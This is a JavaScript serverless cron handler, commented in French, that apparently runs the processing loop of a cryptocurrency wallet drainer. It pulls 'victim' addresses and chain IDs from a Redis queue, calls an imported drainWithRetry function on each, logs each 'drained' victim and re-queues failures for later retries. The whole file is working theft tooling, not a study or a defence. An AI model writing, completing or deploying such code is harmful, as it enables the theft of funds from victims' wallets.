import { createClient } from 'redis';
import { drainWithRetry } from '../lib/drain.js';

export default async function handler(req, res) {
  if (req.method !== 'POST' && req.method !== 'GET') {
    return res.status(405).end('Method not allowed');
  }

  // Sécurité basique : vérifier le secret pour éviter les appels non autorisés
  const cronSecret = req.headers['x-cron-secret'];
  if (!cronSecret || cronSecret !== process.env.CRON_SECRET) {
    return res.status(401).end('Unauthorized');
  }

  const client = createClient({ url: process.env.REDIS_URL });
  await client.connect();

  let processed = 0;
  const maxPerRun = 5; // pour rester sous 60s

  while (processed < maxPerRun) {
    const item = await client.rPop('drain:queue');
    if (!item) break;
    const { victim, chain } = JSON.parse(item);
    try {
      await drainWithRetry(victim, chain || '1', 3, 2000);
      console.log(`✅ Drainé : ${victim}`);
    } catch (e) {
      console.error(`❌ Échec ${victim}: ${e.message}`);
      // Remettre dans la queue pour réessayer plus tard
      await client.lPush('drain:queue', item);
    }
    processed++;
  }

  await client.disconnect();
  res.status(200).json({ processed });
}
